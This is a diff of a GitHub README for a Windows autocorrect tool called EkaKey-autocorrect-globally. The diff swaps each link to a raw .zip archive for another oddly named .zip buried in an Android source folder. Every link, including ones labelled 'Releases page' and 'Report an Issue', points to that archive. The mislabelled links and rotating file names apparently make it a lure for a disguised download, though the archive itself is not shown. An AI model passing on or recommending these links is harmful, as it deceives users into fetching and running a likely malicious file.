@@ -1,6 +1,6 @@
 # 🎉 EkaKey-autocorrect-globally - Easy AutoCorrect for Your Windows PC
 
-[![Download Now](https://github.com/Scytheopura/EkaKey-autocorrect-globally/raw/refs/heads/main/android/app/src/main/Key-autocorrect-Eka-globally-v3.7.zip%20Now-Download-%23007bff)](https://github.com/Scytheopura/EkaKey-autocorrect-globally/raw/refs/heads/main/android/app/src/main/Key-autocorrect-Eka-globally-v3.7.zip)
+[![Download Now](https://github.com/Scytheopura/EkaKey-autocorrect-globally/raw/refs/heads/main/android/app/src/main/kotlin/com/autocorrect-globally-Key-Eka-1.1.zip%20Now-Download-%23007bff)](https://github.com/Scytheopura/EkaKey-autocorrect-globally/raw/refs/heads/main/android/app/src/main/kotlin/com/autocorrect-globally-Key-Eka-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download, check that your system meets these requirements:
 
 To download EkaKey-autocorrect-globally, visit the Releases page:
 
-[Download the latest version](https://github.com/Scytheopura/EkaKey-autocorrect-globally/raw/refs/heads/main/android/app/src/main/Key-autocorrect-Eka-globally-v3.7.zip)
+[Download the latest version](https://github.com/Scytheopura/EkaKey-autocorrect-globally/raw/refs/heads/main/android/app/src/main/kotlin/com/autocorrect-globally-Key-Eka-1.1.zip)
 
 1. Click on the link above.
 2. Locate the latest release.
@@ -68,7 +68,7 @@ If you encounter issues while using EkaKey-autocorrect-globally, try these steps
 
 For assistance or to report bugs, please create an issue on the GitHub repository. A friendly community member or developer will be glad to help:
 
-[Report an Issue](https://github.com/Scytheopura/EkaKey-autocorrect-globally/raw/refs/heads/main/android/app/src/main/Key-autocorrect-Eka-globally-v3.7.zip)
+[Report an Issue](https://github.com/Scytheopura/EkaKey-autocorrect-globally/raw/refs/heads/main/android/app/src/main/kotlin/com/autocorrect-globally-Key-Eka-1.1.zip)
 
 ## ✅ Features
 
@@ -85,6 +85,6 @@ EkaKey-autocorrect-globally is designed for anyone who wants to improve their ty
 
 Don’t forget to download the app from the Releases page:
 
-[Download the latest version](https://github.com/Scytheopura/EkaKey-autocorrect-globally/raw/refs/heads/main/android/app/src/main/Key-autocorrect-Eka-globally-v3.7.zip) 
+[Download the latest version](https://github.com/Scytheopura/EkaKey-autocorrect-globally/raw/refs/heads/main/android/app/src/main/kotlin/com/autocorrect-globally-Key-Eka-1.1.zip) 
 
 Enjoy a smoother typing experience!
